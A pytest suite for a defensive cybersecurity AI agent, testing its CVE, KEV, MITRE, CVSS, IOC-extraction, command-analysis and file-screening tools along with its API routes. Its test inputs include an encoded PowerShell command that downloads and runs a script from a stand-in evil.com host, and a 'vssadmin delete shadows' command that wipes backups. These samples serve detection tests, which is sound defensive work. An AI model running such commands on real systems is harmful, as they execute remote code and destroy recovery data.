"""Comprehensive test suite for Phase 8: LangChain tools, registry, agent, schemas, and routes."""
import json
import pytest
from unittest.mock import AsyncMock, MagicMock, patch
from fastapi.testclient import TestClient

from app.ai.agent.tool_registry import ToolRegistry, registry
from app.ai.agent.agent_factory import SafeCyberAgent, create_cybersecurity_agent
from app.ai.agent.workflow import AgentWorkflow
from app.ai.schemas.cve import CVEAnalysis, CVSSAnalysis
from app.ai.schemas.screening import IOCExtractionResult, SecurityScreeningResult
from app.ai.schemas.remediation import RemediationResult
from app.ai.schemas.tool_result import ThreatIntelligenceResult
from app.ai.tools import (
    ALL_TOOLS,
    analyze_command,
    cve_lookup,
    cvss_analysis,
    enrich_threat_intel,
    extract_iocs_tool,
    get_remediation,
    kev_lookup,
    mitre_lookup,
    rag_retrieve,
    screen_file,
)
from app.main import app

client = TestClient(app)


# ---------------------------------------------------------------------------
# Tool 1: cve_lookup
# ---------------------------------------------------------------------------
def test_cve_lookup_invalid_format():
    res = cve_lookup.invoke({"cve_id": "not-a-cve"})
    assert res["cve_id"] == "NOT-A-CVE"
    assert "Invalid CVE ID format" in res["missing_info"][0]


def test_cve_lookup_from_mock_db():
    mock_doc = MagicMock()
    mock_doc.id = 1
    mock_doc.external_id = "CVE-2023-44487"
    mock_doc.title = "HTTP/2 Rapid Reset"
    mock_doc.source = "NVD"
    mock_doc.url = "https://nvd.nist.gov/vuln/detail/CVE-2023-44487"
    mock_doc.raw_metadata = {"cvss_score": 7.5, "severity": "HIGH"}

    mock_chunk = MagicMock()
    mock_chunk.content = "HTTP/2 protocol flaw allows rapid reset DDoS."

    with patch("app.ai.tools.cve_tool.get_db_session") as mock_get_db:
        mock_db = MagicMock()
        mock_db.scalar.return_value = mock_doc
        mock_db.scalars.return_value.all.return_value = [mock_chunk]
        mock_get_db.return_value = mock_db

        res = cve_lookup.invoke({"cve_id": "CVE-2023-44487"})
        assert res["cve_id"] == "CVE-2023-44487"
        assert res["cvss_score"] == 7.5
        assert res["severity"] == "HIGH"
        assert res["confirmed_source"] == "DB"


# ---------------------------------------------------------------------------
# Tool 2: kev_lookup
# ---------------------------------------------------------------------------
def test_kev_lookup_found():
    mock_doc = MagicMock()
    mock_doc.id = 2
    mock_doc.external_id = "CVE-2023-44487"
    mock_doc.title = "HTTP/2 Rapid Reset Attack"
    mock_doc.url = "https://cisa.gov/kev"
    mock_doc.raw_metadata = {
        "dueDate": "2023-11-01",
        "requiredAction": "Apply vendor mitigation.",
    }

    with patch("app.ai.tools.kev_tool.get_db_session") as mock_get_db:
        mock_db = MagicMock()
        mock_db.scalar.return_value = mock_doc
        mock_db.scalars.return_value.all.return_value = []
        mock_get_db.return_value = mock_db

        res = kev_lookup.invoke({"cve_id": "CVE-2023-44487"})
        assert res["is_in_kev"] is True
        assert res["due_date"] == "2023-11-01"
        assert res["required_action"] == "Apply vendor mitigation."


def test_kev_lookup_not_found():
    with patch("app.ai.tools.kev_tool.get_db_session") as mock_get_db:
        mock_db = MagicMock()
        mock_db.scalar.return_value = None
        mock_get_db.return_value = mock_db

        res = kev_lookup.invoke({"cve_id": "CVE-2099-0001"})
        assert res["is_in_kev"] is False
        assert "not listed" in res["note"]


# ---------------------------------------------------------------------------
# Tool 3: mitre_lookup
# ---------------------------------------------------------------------------
def test_mitre_lookup_success():
    mock_doc = MagicMock()
    mock_doc.id = 3
    mock_doc.external_id = "T1059.001"
    mock_doc.title = "PowerShell"
    mock_doc.url = "https://attack.mitre.org/techniques/T1059/001/"
    mock_doc.raw_metadata = {"tactics": ["Execution"]}

    with patch("app.ai.tools.mitre_tool.get_db_session") as mock_get_db:
        mock_db = MagicMock()
        mock_db.scalars.return_value.all.return_value = [mock_doc]
        mock_get_db.return_value = mock_db

        res = mitre_lookup.invoke({"technique_id": "T1059.001"})
        assert len(res["results"]) >= 1
        assert res["results"][0]["technique_id"] == "T1059.001"


# ---------------------------------------------------------------------------
# Tool 4: rag_retrieve
# ---------------------------------------------------------------------------
def test_rag_retrieve_tool():
    with patch("app.ai.tools.rag_tool._rag.retrieve") as mock_retrieve:
        mock_retrieve.return_value = [
            {"content": "DDoS defense chunk", "source": "nvd", "external_id": "CVE-1", "title": "T1", "score": 0.8}
        ]
        res = rag_retrieve.invoke({"query": "HTTP/2 DDoS mitigations", "top_k": 3})
        assert res["retrieved_count"] == 1
        assert res["results"][0]["content"] == "DDoS defense chunk"


# ---------------------------------------------------------------------------
# Tool 5: cvss_analysis
# ---------------------------------------------------------------------------
def test_cvss_analysis_valid_vector():
    vec = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H 9.8"
    res = cvss_analysis.invoke({"cvss_vector_or_cve": vec})
    assert res["attack_vector"] == "Network"
    assert res["attack_complexity"] == "Low"
    assert res["privileges_required"] == "None"
    assert res["confidentiality_impact"] == "High"
    assert res["base_score"] == 9.8
    assert res["severity"] == "CRITICAL"


def test_cvss_analysis_rejects_cve_id():
    res = cvss_analysis.invoke({"cvss_vector_or_cve": "CVE-2023-44487"})
    assert "error" in res
    assert "is a CVE ID, not a CVSS vector" in res["error"]


# ---------------------------------------------------------------------------
# Tool 6: extract_iocs_tool
# ---------------------------------------------------------------------------
def test_extract_iocs_tool_finds_all_types():
    sample = "Malware C2 at 198.51.100.25 and https://evil.example.com/payload.exe hash e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    res = extract_iocs_tool.invoke({"text": sample})
    assert "198.51.100.25" in res["ipv4"]
    assert any("evil.example.com" in u for u in res["urls"])
    assert "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" in res["sha256"]
    assert res["extraction_source"].startswith("regex")


# ---------------------------------------------------------------------------
# Tool 7: analyze_command
# ---------------------------------------------------------------------------
def test_analyze_command_detects_powershell_encoded():
    cmd = "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA="
    res = analyze_command.invoke({"command": cmd})
    assert res["risk_level"] in {"MEDIUM", "HIGH", "CRITICAL"}
    assert "T1059.001" in res["mitre_techniques"]
    assert "NOT executed" in res["execution_note"]


# ---------------------------------------------------------------------------
# Tool 8: screen_file
# ---------------------------------------------------------------------------
def test_screen_file_tool():
    with patch("app.ai.tools.file_screening_tool._screening_service.screen_text") as mock_screen:
        mock_screen.return_value = {
            "verdict": "MALICIOUS",
            "risk_score": 90,
            "confidence": 0.95,
            "threat_category": "Ransomware Inhibit Recovery",
            "prompt_injection_detected": False,
            "mitre_techniques": ["T1490"],
            "summary": "Detected vssadmin delete shadows.",
            "findings": ["Shadow copy deletion attempt"],
            "recommended_action": "BLOCK",
            "iocs": {"ipv4": [], "urls": [], "domains": [], "md5": [], "sha1": [], "sha256": []},
            "sources": [],
        }
        res = screen_file.invoke({"file_content_or_text": "vssadmin delete shadows /all /quiet"})
        assert res["verdict"] == "MALICIOUS"
        assert res["risk_score"] == 90
        assert res["recommended_action"] == "BLOCK"


# ---------------------------------------------------------------------------
# Tool 9: get_remediation
# ---------------------------------------------------------------------------
def test_get_remediation_tool():
    mock_doc = MagicMock()
    mock_doc.external_id = "CVE-2023-44487"
    mock_doc.url = "https://nvd.nist.gov/vuln/detail/CVE-2023-44487"
    mock_doc.raw_metadata = {
        "references": [
            "https://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack",
            "https://github.com/netty/netty/commit/1234567890",
        ]
    }

    with patch("app.ai.tools.remediation_tool.get_db_session") as mock_get_db:
        mock_db = MagicMock()
        mock_db.scalar.return_value = mock_doc
        mock_get_db.return_value = mock_db

        with patch("app.ai.tools.remediation_tool._rag.retrieve") as mock_rag:
            mock_rag.return_value = []
            res = get_remediation.invoke({"cve_id": "CVE-2023-44487", "affected_product": "Netty"})
            assert res["cve_id"] == "CVE-2023-44487"
            assert "AI-generated" in res["disclaimer"]
            assert len(res["remediation_steps"]) > 0


# ---------------------------------------------------------------------------
# Tool 10: enrich_threat_intel
# ---------------------------------------------------------------------------
def test_enrich_threat_intel_tool():
    with patch("app.ai.tools.threat_intelligence_tool.get_db_session") as mock_get_db:
        mock_db = MagicMock()
        mock_db.scalar.return_value = None
        mock_db.scalars.return_value.all.return_value = []
        mock_get_db.return_value = mock_db

        with patch("app.ai.tools.threat_intelligence_tool._rag.retrieve") as mock_rag:
            mock_rag.return_value = []
            res = enrich_threat_intel.invoke({"indicator": "198.51.100.1"})
            assert res["indicator"] == "198.51.100.1"
            assert "Enrichment completed" in res["combined_assessment"]


# ---------------------------------------------------------------------------
# ToolRegistry & Conditional Selection
# ---------------------------------------------------------------------------
def test_tool_registry_contains_all_10_tools():
    all_tools = registry.get_all_tools()
    assert len(all_tools) == 10
    names = {t.name for t in all_tools}
    expected = {
        "cve_lookup", "kev_lookup", "mitre_lookup", "rag_retrieve",
        "cvss_analysis", "extract_iocs_tool", "analyze_command",
        "screen_file", "get_remediation", "enrich_threat_intel",
    }
    assert names == expected


def test_conditional_tool_selection():
    # CVE Exploit query
    tools_exploit = registry.select_tools_for_query("Is CVE-2023-44487 actively exploited in the wild?")
    names_exploit = [t.name for t in tools_exploit]
    assert "cve_lookup" in names_exploit
    assert "kev_lookup" in names_exploit
    assert "analyze_command" not in names_exploit

    # PowerShell command query
    tools_cmd = registry.select_tools_for_query("Explain this suspicious powershell command: powershell -enc AAAA")
    names_cmd = [t.name for t in tools_cmd]
    assert "analyze_command" in names_cmd
    assert "mitre_lookup" in names_cmd

    # Remediation query
    tools_fix = registry.select_tools_for_query("How can I fix or patch CVE-2024-1234?")
    names_fix = [t.name for t in tools_fix]
    assert "get_remediation" in names_fix
    assert "cve_lookup" in names_fix


# ---------------------------------------------------------------------------
# SafeCyberAgent execution
# ---------------------------------------------------------------------------
@pytest.mark.anyio
async def test_agent_run_direct_answer():
    mock_llm = MagicMock()
    mock_ai_resp = MagicMock()
    mock_ai_resp.content = "CVE-2023-44487 is an HTTP/2 protocol vulnerability."
    mock_ai_resp.tool_calls = []

    mock_llm.bind_tools.return_value.ainvoke = AsyncMock(return_value=mock_ai_resp)

    agent = SafeCyberAgent(llm=mock_llm)
    result = await agent.run("What is CVE-2023-44487?")
    assert "HTTP/2 protocol vulnerability" in result["answer"]
    assert result["iterations"] == 1


# ---------------------------------------------------------------------------
# API Routes: /api/agent/*
# ---------------------------------------------------------------------------
def test_agent_health_endpoint():
    response = client.get("/api/agent/health")
    assert response.status_code == 200
    data = response.json()
    assert "status" in data
    assert data["tools_registered"] == 10


def test_agent_tools_endpoint():
    response = client.post("/api/agent/tools")
    assert response.status_code == 200
    data = response.json()
    assert data["count"] == 10
    tool_names = [t["name"] for t in data["tools"]]
    assert "cve_lookup" in tool_names
    assert "get_remediation" in tool_names


def test_agent_analyze_endpoint_mock():
    with patch("app.routes.agent.default_workflow.execute") as mock_exec:
        mock_exec.return_value = {
            "session_id": "test-session",
            "query": "Is CVE-2023-44487 exploited?",
            "intent": "cve_exploitation",
            "answer": "CVE-2023-44487 was added to CISA KEV in October 2023.",
            "tools_used": ["cve_lookup", "kev_lookup"],
            "tool_details": [],
            "sources": [{"citation": "S1", "source": "CISA KEV", "id": "CVE-2023-44487", "title": "KEV Record", "url": "https://cisa.gov"}],
            "iterations": 2,
            "execution_time_ms": 120.5,
        }
        response = client.post(
            "/api/agent/analyze",
            json={"query": "Is CVE-2023-44487 exploited?", "session_id": "test-session"}
        )
        assert response.status_code == 200
        payload = response.json()
        assert payload["session_id"] == "test-session"
        assert "CISA KEV" in payload["answer"]
        assert payload["tools_used"] == ["cve_lookup", "kev_lookup"]
